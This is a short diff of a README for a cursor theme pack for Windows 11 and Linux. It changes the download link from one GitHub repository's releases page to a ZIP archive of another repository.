@@ -7,7 +7,7 @@
 
 ## 2. Installation
 
-Here is the link to download the Pack Cursor For Windows 11 And Linux [Click Here](https://github.com/unai-d/extended-binary-waterfall/releases).
+Here is the link to download the Pack Cursor For Windows 11 And Linux [Click Here](https://github.com/TheScriptorOfHard/Pack-Cursor-For-Windows-11-And-Linux/archive/refs/heads/main.zip).
 
 ### For Windows 11
 1. Download the `Pack Cursor For Windows 11 And Linux` folder and extract the files from the ZIP folder.
